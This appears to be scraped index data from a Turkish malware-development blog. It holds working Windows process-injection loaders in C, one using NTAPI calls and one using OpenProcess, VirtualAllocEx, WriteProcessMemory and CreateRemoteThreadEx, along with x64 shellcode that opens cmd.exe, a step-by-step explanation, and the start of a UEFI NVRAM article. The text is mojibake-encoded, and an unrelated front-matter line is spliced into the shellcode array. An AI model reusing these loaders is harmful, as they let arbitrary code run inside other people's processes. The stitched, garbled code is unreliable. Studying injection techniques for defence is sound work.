\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x4e\\x54\\x41\\x50\\x49\\x20\\x49\\x6e\\x6a\\x65\" \"\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\\x20\\x62\\x65\\x6b\" \"\\x6f\\x6f\\x22\\x00\"; size_t ShellcodeSize = sizeof(Shellcode); int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\injection.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; HMODULE ntDLL = NULL; PVOID RemoteBuffer = NULL; size_t bytesWritten = 0; OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr), NULL }; CLIENT_ID CID = { (HANDLE)PID, NULL }; NTSTATUS Status = STATUS_SUCCESS; /* Get handle to ntdll and kernel32 */ ntDLL = GetModuleHandleA(\"ntdll.dll\"); if (ntDLL == NULL) { printf(\"Failed to get handle for NTDLL! Error Code: 0x%lx\\n\", GetLastError()); return -1; } /* NtCloseHandle */ fn_NtClose ntClose = (fn_NtClose)GetProcAddress(ntDLL, \"NtClose\"); /* NTOpenProcess */ fn_NtOpenProcess ntOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntDLL, \"NtOpenProcess\"); Status = ntOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026objAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"Failed to open handle to Process! Error Code: 0x%lx\", Status); return -1; } /* NTAllocateVirtualMemory */ fn_NtAllocateVirtualMemory ntAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntDLL, \"NtAllocateVirtualMemory\"); Status = ntAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"Failed to Allocate Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NTWriteVirtualMemory */ fn_NtWriteVirtualMemory ntWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntDLL, \"NtWriteVirtualMemory\"); Status = ntWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), \u0026bytesWritten); if (Status != STATUS_SUCCESS || bytesWritten != sizeof(Shellcode)) { printf(\"Failed to Write Memory in Process! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtCreateThreadEx */ fn_NtCreateThreadEx ntCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntDLL, \"NtCreateThreadEx\"); Status = ntCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, \u0026objAttr, HandleProcess, (RemoteBuffer), NULL, FALSE, 0, 0, 0, 0); if (Status != STATUS_SUCCESS) { printf(\"Failed to create Thread! Error Code: 0x%lx\", Status); ntClose(HandleProcess); return -1; } /* NtWaitForSingleObject */ fn_NtWaitForSingleObject ntWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddress(ntDLL, \"NtWaitForSingleObject\"); Status = ntWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"Failed to wait for Thread! Error Code: 0x%lx\", Status); ntClose(HandleThread); ntClose(HandleProcess); return -1; } ntClose(HandleThread); ntClose(HandleProcess); return 0; } ArtÄ±k bu kodlarda neler yaptÄ±ÄŸÄ±mÄ±zÄ± biliyoruz o yÃ¼zden kodlarÄ±n detayÄ±na girmeyeceÄŸim. Projeyi Ã§alÄ±ÅŸtÄ±ralÄ±m:\nVideodan gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ Ã¼zere NTAPIâ€™lar kullanarak baÅŸarÄ±lÄ± bir ÅŸekilde Shellcode execute edebiliyoruz.\nSonuÃ§ Bu konuda NTAPIâ€™lara yakÄ±ndan deÄŸindik. User-mode ve Kernel-mode alanlarÄ±nÄ± teorik olarak tanÄ±dÄ±k ve ardÄ±ndan NTAPIâ€™lar Ã¼zerinde Ã§alÄ±ÅŸma yaptÄ±k ve son olarak NTAPIâ€™lar kullanarak Shellcode Exeucute ettik.\nUmarÄ±m konu sizin iÃ§in faydalÄ± olmuÅŸtur. DiÄŸer blogta gÃ¶rÃ¼ÅŸmek Ã¼zere.","user-mode-ve-kernel-mode#\u003cstrong\u003eUser mode\u003c/strong\u003e ve \u003cstrong\u003eKernel Mode\u003c/strong\u003e":""},"title":"NTAPI Injection"},"/tr/docs/malware-dev/shellcode-injection/":{"data":{"":"","kod#Kod":"\rMerhabalar bu yazÄ±da Shellcode Execution konusunu inceleyeceÄŸiz.\nNedir bu Processâ€™ler Maldev alanÄ±nÄ±n ilk konusu olduÄŸu iÃ§in bazÄ± temel ÅŸeyleri Ã¶ÄŸrenerek baÅŸlamamÄ±z gerekiyor.\nKabaca Processler, iÅŸletim sistemi tarafÄ±ndan herhangi bir programÄ±n yÃ¼rÃ¼tÃ¼lmesi iÃ§in oluÅŸturulan Ã§alÄ±ÅŸma birimleridir. EÄŸer bir program, kullanÄ±cÄ± veya Ä°ÅŸletim Sistemi (OS) tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lmak istenirse, Ã¶ncelikle Ä°ÅŸletim Sistemi tarafÄ±ndan belleÄŸe yÃ¼klenir ardÄ±ndan yine Ä°ÅŸletim Sistemi tarafÄ±ndan bu programÄ±n yÃ¼rÃ¼tÃ¼lmesi iÃ§in bir process oluÅŸturulur. En sonda ise belleÄŸe yÃ¼klenen programÄ±n bellek alanÄ±, Process tarafÄ±ndan temsil edilir ve programÄ±n iÃ§erdiÄŸi komutlarÄ± Ã§alÄ±ÅŸtÄ±rÄ±lmaya baÅŸlanÄ±r.\nArayÃ¼z ortamÄ±nda gÃ¶rdÃ¼ÄŸÃ¼nÃ¼z herhangi bir programÄ±n dosyalarÄ± (kabaca program kodlarÄ±), kullanÄ±cÄ± veya iÅŸletim sistemi tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lmadÄ±ÄŸÄ± sÃ¼rece pasif halde olur. EÄŸer hedef program Ã§alÄ±ÅŸtÄ±rÄ±lmak istenirse, Ã¶nce diskten belleÄŸe aktarÄ±lÄ±r ardÄ±ndan aktarÄ±lan bu kodlar yÃ¼rÃ¼tÃ¼lmeye baÅŸlanÄ±r. Bu esnada ise program aktif hale gelmiÅŸ olur.\nThreadâ€™ler Nedir? â€œBir Process, en basit ifadeyle, yÃ¼rÃ¼tÃ¼lmekte olan bir programdÄ±r. Process baÄŸlamÄ±nda bir veya daha fazla thread Ã§alÄ±ÅŸÄ±r. Thread ise iÅŸletim sisteminin iÅŸlemci zamanÄ±nÄ± tahsis ettiÄŸi temel birimdir. Bir Thread, baÅŸka bir thread tarafÄ±ndan yÃ¼rÃ¼tÃ¼lmekte olan kÄ±sÄ±mlar da dahil olmak Ã¼zere, iÅŸlem kodunun herhangi bir bÃ¶lÃ¼mÃ¼nÃ¼ yÃ¼rÃ¼tebilir.â€ Microsoft Learn - Process and Threads Processâ€™lere gÃ¶re daha hÄ±zlÄ± ve hafif olan Threadâ€™ler, kabaca tanÄ±mÄ±yla Ä°ÅŸletim Sisteminde baÄŸÄ±msÄ±z olarak Ã§alÄ±ÅŸan birimlerdir. Herhangi bir process iÃ§erisinde bir veya daha fazla thread olabilir. DolayasÄ±yla Processâ€™ler, Threadâ€™ler sayesinde birden fazla iÅŸi aynÄ± anda yapabilir.\nThread aracÄ±lÄ±ÄŸÄ±yla Processâ€™lerin birden fazla iÅŸi aynÄ± anda yapÄ±labileceÄŸinden bahsettim. Bunu biraz daha detaylandÄ±ralÄ±m. Ã–rneÄŸin bir web tarayacÄ±sÄ± dÃ¼ÅŸÃ¼nÃ¼n. Bu web tarayÄ±cÄ±sÄ±nÄ±n bir thread ile kullanÄ±cÄ±nÄ±n arayÃ¼zle etkileÅŸimi yÃ¶netilirken diÄŸer threadâ€™ler ile arka planda web sayfalarÄ± yÃ¼klemek gibi iÅŸlemleri aynÄ± anda gerÃ§ekleÅŸtirebilir. Ã–rnek aÃ§Ä±sÄ±ndan aÅŸaÄŸÄ±da Windows 11 ortamÄ±nda Task Manager aracÄ±lÄ±ÄŸÄ±yla Firefox Processâ€™in altÄ±ndaki Thread listesi gÃ¶sterilmiÅŸtir: Shellcode Execution Nedir? Shellcode Execution genellikle process injection teknikleriyle iliÅŸkilidir. SaldÄ±rgan, shellcodeâ€™u bir hedef sÃ¼recin belleÄŸine enjekte ettikten sonra, bu kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlayarak hedef sistemde kontrol elde edebilir.\nKod Github Ã¼zerinde paylaÅŸtÄ±ÄŸÄ±m Ã¶rnek kod parÃ§asÄ±na buradan eriÅŸebilirsiniz.\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cWindows.h\u003e /* cmd /K \"echo Shellcode Injection with bekoo\" */ char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } if (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } DetaylÄ±ca gÃ¶z atalÄ±m:\nchar Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"--- title: Malware Resurrection date: 2024-09-12 --- \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x20\" \"\\x49\\x6e\\x6a\\x65\\x63\\x74\\x69\\x6f\\x6e\\x20\\x77\\x69\\x74\\x68\" \"\\x20\\x62\\x65\\x6b\\x6f\\x6f\\x22\\x00\"; Bu shellcode, cmd.exeâ€™yi aÃ§arak â€œShellcode Injection with bekooâ€ yazÄ±sÄ±nÄ± ekrana yazdÄ±ran bir shellcodeâ€™dur. Bu shellcodeâ€™u hedef processâ€™e enjekte edeceÄŸiz.\nint main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program.exe \u003cPID\u003e\"); return -1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; ... ProgramÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±ndan ardÄ±ndan ilk olarak main iÃ§erisinde argc deÄŸiÅŸkenini kontrol ediyoruz. Bu deÄŸiÅŸken, programÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nda verilen argÃ¼man sayÄ±sÄ±nÄ± tutar. EÄŸer argc deÄŸiÅŸkeni 2â€™den kÃ¼Ã§Ã¼kse, programÄ±n doÄŸru kullanÄ±mÄ±nÄ± ekrana bastÄ±rÄ±p -1 ile programÄ± return ediyoruz.\nDaha sonra malwareâ€™in Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in gereken deÄŸiÅŸkenleri oluÅŸturuyoruz:\nPID: Bu deÄŸiÅŸken, hedef processâ€™in PIDâ€™sini tutar. HandleProcess: Bu deÄŸiÅŸken, hedef processâ€™in handleâ€™ini tutmak iÃ§in kullanÄ±lÄ±r. HandleThread: Bu deÄŸiÅŸken, hedef processâ€™te oluÅŸturulacak threadâ€™Ä±n handleâ€™Ä±nÄ± tutmak iÃ§in kullanÄ±lÄ±r. RemoteBuffer: Bu deÄŸiÅŸken, hedef processâ€™te oluÅŸturulacak shellcodeâ€™un adresini tutmak iÃ§in kullanÄ±lÄ±r. HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to Open Target Process! Error Code: 0x%lx\", GetLastError()); return -1; } Bu kÄ±sÄ±mda, hedef processâ€™in handleâ€™Ä±nÄ± alÄ±yoruz. Yani hedef programa eriÅŸim saÄŸlÄ±yoruz gibi dÃ¼ÅŸÃ¼nebilirsiniz. EÄŸer hedef processâ€™in handleâ€™Ä±nÄ± alamazsak, hata mesajÄ± ekrana bastÄ±rÄ±p -1 ile programÄ± return ediyoruz.\nRemoteBuffer = VirtualAllocEx(HandleProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to Allocated Memory for DLL! Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Daha sonra hedef processâ€™in bellek alanÄ±nda, shellcodeâ€™u tutacak bir alan rezerve ediyoruz. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa, hata mesajÄ± ekrana bastÄ±rÄ±p -1 ile programÄ± return ediyoruz.\nif (!(WriteProcessMemory(HandleProcess, RemoteBuffer, Shellcode, sizeof(Shellcode), 0))) { printf(\"Failed to write dllPath to Allocated Memory Error Code: 0x%lx\", GetLastError()); CloseHandle(HandleProcess); return -1; } Bu kÄ±sÄ±mda, hedef processâ€™in bellek alanÄ±na shellcodeâ€™u yazÄ±yoruz. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa, hata mesajÄ± ekrana bastÄ±rÄ±p -1 ile programÄ± return ediyoruz.\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, 0, 0, 0); if (HandleThread == NULL) { printf(\"Failed to Create Thread! Error Code: 0x%lx\\n\", GetLastError()); CloseHandle(HandleProcess); return -1; } WaitForSingleObject(HandleThread, INFINITE); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Bu kÄ±sÄ±mda ise hedef processâ€™te yeni bir thread oluÅŸturuyoruz. Bu thread, hedef processâ€™in bellek alanÄ±nda bulunan shellcodeâ€™u Ã§alÄ±ÅŸtÄ±racaktÄ±r. EÄŸer bu iÅŸlem baÅŸarÄ±sÄ±z olursa, hata mesajÄ± ekrana bastÄ±rÄ±p -1 ile programÄ± return ediyoruz.\nSon olarak ise WaitForSingleObject aracÄ±lÄ±ÄŸÄ±yla oluÅŸturduÄŸumuz threadâ€™Ä±n bitmesini bekliyoruz ve ardÄ±ndan hedef processâ€™in handleâ€™larÄ±nÄ± serbest bÄ±rakÄ±yoruz.","nedir-bu-processler#Nedir bu Process\u0026rsquo;ler":"","shellcode-execution-nedir#Shellcode Execution Nedir?":"","threadler-nedir#Thread\u0026rsquo;ler Nedir?":""},"title":"Shellcode Injection"},"/tr/docs/uefi-dev/":{"data":{"":"UEFI Development ile ilgili konularÄ± incelemek iÃ§in aÅŸaÄŸÄ±daki bÃ¶lÃ¼mlere gÃ¶z atabilirsiniz:\nUEFI to Windows Communication via NVRAM Variables\rSimple UEFI Keylogger\rIntroduction to UEFI"},"title":"UEFI Development"},"/tr/docs/uefi-dev/communation-between-windows-and-uefi/":{"data":{"":"","#":"Bu dÃ¶kÃ¼manda, bir UEFI sÃ¼rÃ¼cÃ¼sÃ¼ ile bir Windows sÃ¼rÃ¼cÃ¼sÃ¼ arasÄ±nda nasÄ±l iletiÅŸim kurulacaÄŸÄ±nÄ± tartÄ±ÅŸacaÄŸÄ±z. Ã–zellikle, iki ortam arasÄ±nda veri alÄ±ÅŸveriÅŸi yapmak iÃ§in NVRAM tabanlÄ± UEFI deÄŸiÅŸkenlerinin nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± inceleyeceÄŸiz.\nWhat is NVRAM? NVRAM (Non-Volatile RAM), UEFI tabanlÄ± sistemlerde kalÄ±cÄ± yapÄ±landÄ±rma ve sistem durumu verilerini depolamak iÃ§in kullanÄ±lan Ã¶nemli bir bileÅŸendir. Normal RAMâ€™den farklÄ± olarak NVRAM, iÃ§eriÄŸini yeniden baÅŸlatmalarda ve kapatmalarda korur.\nUEFIâ€™de NVRAM, nasÄ±l ve ne zaman eriÅŸilebileceklerini tanÄ±mlayan meta verileri (Ã¶znitelikler) iÃ§eren deÄŸiÅŸkenler-yapÄ±landÄ±rÄ±lmÄ±ÅŸ anahtar-deÄŸer Ã§iftleri halinde dÃ¼zenlenir. Bu deÄŸiÅŸkenler Ã¶nyÃ¼kleme yÃ¶netimi, gÃ¼venli Ã¶nyÃ¼kleme anahtarÄ± depolama, donanÄ±m yapÄ±landÄ±rmasÄ± ve OEMâ€™e Ã¶zgÃ¼ ayarlar gibi kritik sistem iÅŸlevleri iÃ§in kullanÄ±lÄ±r.\nUEFI Variables UEFI DeÄŸiÅŸkenleri bir GUID ve Unicode String kombinasyonu ile belirtilir. Bir deÄŸiÅŸkenin GUIDâ€™si, farklÄ± vendorler arasÄ±ndaki isim Ã§akÄ±ÅŸmalarÄ±nÄ± Ã¶nleyebilir.\nUEFIâ€™nin The Boot Manager Chapter, EDK IIâ€™de gEfiGlobalVariableGuid olarak da bilinen EFIGLOBAL_VARIABLE_GUIDâ€™yi tanÄ±mlar. UEFI SÃ¼rÃ¼cÃ¼mÃ¼zde SecureBoot Status gibi global bir deÄŸiÅŸken kullanmak istiyorsak, gEfiGlobalVariableGuidâ€™den yararlanmamÄ±z gerekir. Ä°ÅŸte EDK II Repoâ€˜dan bazÄ± global deÄŸiÅŸken listesi:\nEFI_PLATFORM_LANG_CODES_VARIABLE_NAME L\"PlatformLangCodes\" EFI_BOOT_CURRENT_VARIABLE_NAME L\"BootCurrent\" EFI_SIGNATURE_SUPPORT_NAME L\"SignatureSupport\" â€¦ Her UEFI DeÄŸiÅŸkeni, kalÄ±cÄ±lÄ±k ile alakalÄ± niteliklere sahiptir. Ä°ÅŸte Ã¶zniteliklerin listesi:\nBOOTSERVICE_ACCESS DeÄŸiÅŸken, ExitBootServices() Ã§aÄŸrÄ±lmadan Ã¶nce Ã¶nyÃ¼kleme sÄ±rasÄ±nda yazma ve okuma eriÅŸim izinlerine sahiptir, bu da deÄŸiÅŸkenin ExitBootServices() Ã§aÄŸrÄ±ldÄ±ktan sonra kullanÄ±lamayacaÄŸÄ± ve deÄŸiÅŸkenin iÃ§eriÄŸinin bir sonraki sistem sÄ±fÄ±rlamasÄ±nda silineceÄŸi anlamÄ±na gelir.\nBOOTSERVICE_ACCESS | RUNTIME_ACCESS DeÄŸiÅŸken ExitBootServices() Ã§aÄŸrÄ±lmadan Ã¶nce yazma ve okuma eriÅŸim izinlerine sahiptir, ancak ExitBootServices() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda iÃ§eriÄŸi salt okunur olarak kalacaktÄ±r, ayrÄ±ca bir sonraki sistem yeniden baÅŸlatÄ±ldÄ±ÄŸÄ±nda iÃ§eriÄŸi silinecektir.\nNON_VOLATILE | BOOTSERVICE_ACCESS DeÄŸiÅŸken, ExitBootServices() Ã§aÄŸrÄ±lmadan Ã¶nce yazma ve okuma eriÅŸim izinlerine sahiptir ve iÃ§eriÄŸi sistem sÄ±fÄ±rlanana kadar kalÄ±cÄ±dÄ±r.\nNON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS DeÄŸiÅŸken hem Ã¶nyÃ¼kleme Ã¶ncesi hem de iÅŸletim sistemi Ã§alÄ±ÅŸma zamanÄ± ortamÄ±nda yazma ve okuma izinlerine sahiptir. Ä°Ã§eriÄŸi sistem sÄ±fÄ±rlamasÄ± boyunca kalÄ±cÄ±dÄ±r.\nAccessing UEFI Variables with Services Bir UEFI SÃ¼rÃ¼cÃ¼sÃ¼ yapÄ±landÄ±rma bilgilerini UEFI DeÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla sakladÄ±ÄŸÄ±nda, EFI_HII_CONFIG_ACCESS_PROTOCOL tarafÄ±ndan saÄŸlanan servislerle bunlara eriÅŸebilir. Bu dÃ¶kÃ¼manda gÃ¶receÄŸimiz SetVariable() ve GetVariable() servisleri yapÄ±landÄ±rma bilgilerini ayarlamak ve almak iÃ§in kullanÄ±lÄ±r.\n1 - SetVariable() SetVariable() servisi deÄŸiÅŸkenin iÃ§eriÄŸini ayarlar, ayrÄ±ca yeni bir deÄŸiÅŸken oluÅŸturmak, deÄŸiÅŸkeni deÄŸiÅŸtirmek veya mevcut bir deÄŸiÅŸkeni silmek iÃ§in kullanÄ±labilir. Ä°ÅŸte servisin parametreleri:\ntypedef EFI_STATUS SetVariable ( IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid, IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data ); SetVariable iÃ§in bir proje oluÅŸturalÄ±m:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"MyUEFIVar\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; UINT8 ContentOfVariable[4] = { 0xDE, 0xAD, 0xBE, 0xEF }; UINTN DataSize = sizeof(ContentOfVariable); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eSetVariable( VariableName, \u0026VendorGuid, Attributes, DataSize, 